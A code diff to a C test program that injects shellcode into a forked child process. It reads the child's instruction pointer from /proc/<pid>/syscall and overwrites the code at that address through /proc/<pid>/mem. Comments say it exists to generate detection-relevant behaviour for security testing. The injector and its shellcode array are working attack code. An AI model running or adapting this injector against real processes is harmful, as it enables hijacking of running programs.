@@ -8,7 +8,7 @@
 #include <elf.h>
 
 unsigned char shellcode[] = {
-    0x90, 0x90,                    // NOP, NOP for the Linux kernel syscall restarting
+    0x90, 0x90,                    // NOP, NOP to understand why look for the [!] point in the description 
     // --- start: ---
     0x48, 0x83, 0xe4, 0xf0,        // and rsp, -16        (stack alignment)
     0xeb, 0x26,                    // jmp short get_path
@@ -30,7 +30,7 @@ unsigned char shellcode[] = {
     0x70, 0x77, 0x6e, 0x65, 0x64,  // "pwned"
     0x00                          
 };
-unsigned int shellcode_len = 62;
+unsigned int shellcode_len = sizeof(shellcode);
 
 #define MAX_LOOPS 100
 
@@ -39,11 +39,10 @@ pid_t create_victim_child_process() {
     if (pid < 0) {
         return 0;
     } else if (pid == 0) {
-        printf("[Victim Process]:  PID = %d\n", getpid());
         sleep(2);
         exit(0);
     }
-    sleep(0.2);
+    usleep(200000);
     return pid;
 }
 
@@ -108,7 +107,7 @@ long get_reg(pid_t pid, const char* reg) {
     int fd = open(path, O_RDONLY);
     if (fd < 0) return -1;
 
-    //try to read registers until theu became available
+    //try to read registers until they become available
     ssize_t bytesRead;
     int i=0;
     while (i < MAX_LOOPS && (bytesRead = pread(fd, buffer, sizeof(buffer) - 1, 0)) > 0) {
@@ -119,6 +118,7 @@ long get_reg(pid_t pid, const char* reg) {
     }
 
     close(fd);
+    if (bytesRead <= 0) return -1;
     buffer[bytesRead] = '\0';
 
     long syscall, rdi, rsi, rdx, r10, r8, r9, rsp, rip;
@@ -151,14 +151,15 @@ int main(int argc, char *argv[]) {
 
     long instruction_pointer = get_reg(pid, "rip");
     if (instruction_pointer == -1) {
-        fprintf(stderr, "[-] Instruction pointer not found\n");
+        fprintf(stderr, "[-] Failed to read instruction pointer\n");
         exit(1);
     }
     printf("[+] Instruction pointer: 0x%lx\n", instruction_pointer);
 
     unsigned char stack[shellcode_len];
-    read_mem(stack, pid, instruction_pointer-2, shellcode_len);
-    printf("[+] Memory around IP before the injection: \n");
+    if (read_mem(stack, pid, instruction_pointer - 2, shellcode_len) != 0) 
+        fprintf(stderr, "[!] Warning: failed to read memory\n");
+    printf("[+] Memory around IP before the overwrite: \n");
     print_mem(stack, shellcode_len);
 
     if( write_in_mem(instruction_pointer - 2, pid, shellcode, shellcode_len) != (ssize_t)shellcode_len){
@@ -167,8 +168,9 @@ int main(int argc, char *argv[]) {
     }
     printf("[+] Payload written in the current instruction location\n");
 
-    read_mem(stack, pid, instruction_pointer-2, shellcode_len);
-    printf("[+] Memory around IP after the injection: \n");
+    if (read_mem(stack, pid, instruction_pointer - 2, shellcode_len) != 0)
+        fprintf(stderr, "[!] Warning: failed to read memory\n");
+    printf("[+] Memory around IP after the overwrite: \n");
     print_mem(stack, shellcode_len);
 
     printf("[+] Injection finished\n");
@@ -177,10 +179,10 @@ int main(int argc, char *argv[]) {
 
 /**
  * This technique implements a Direct Instruction Overwrite.
- * Bypassing the need for a separate Code Cave,
+ * Bypassing the need to look for a separate Code Cave,
  * it locates the exact memory address the CPU is about to execute
- * (via the RIP register, gathered in the /proc/PID/syscall file)
- * and overwrites that location with the entire shellcode in /porc/PID/mem.
+ * (via the RIP register, read from the /proc/<pid>/syscall file)
+ * and overwrites that location with the entire shellcode in /proc/PID/mem.
  * 
  * The injection targets RIP - 2 to account for Linux kernel syscall restarting:
  * when a process interrupted during a system call is resumed,
@@ -188,15 +190,16 @@ int main(int argc, char *argv[]) {
  * To prevent crashes in cases where the process was not in a syscall,
  * a NOP sled (padding with 0x90) is prepended to the payload,
  * ensuring the execution flow safely slides into the shellcode regardless of the exact byte offset.
- * [!]: Keep in mind that this code would not strictly need to account for syscall restarts,
- * as the injection doesn't rely on that specific type of interruption.
- * However, I chose to include it to generalize the technique (and because it's cool).
+ * [!]: Strictly speaking, this technique does not require handling syscall restarts,
+ * since we are not interrupting the victim during a syscall. The NOP sled is included for generality
+ * (the same shellcode could be reused in scenarios where syscall restarting does occur)
+ * and as a defensive measure against off-by-a-few-bytes inaccuracies in the RIP read from /proc/<pid>/syscall.
  * 
  * Note: this test forks a child process to use as the injection target.
  * This allows the test to run on systems where ptrace_scope=1 (default on most Linux distributions),
  * where a process can only modify the memory of its own descendants.
- * This may differs from a real-world scenario where the attacker targets an arbitrary process,
- * but for the purpose of this test it preserves the detection-relevant behavior: the same syscalls and /proc/[pid]/mem
+ * This may differ from a real-world scenario where the attacker targets an arbitrary process,
+ * but for the purpose of this test it preserves the detection-relevant behavior: the same syscalls and /proc/<pid>]/mem
  * access patterns are generated regardless of the relationship between injector and target.
  * 
  * Injection inspired by Ori David in "The Definitive Guide to Linux Process Injection"
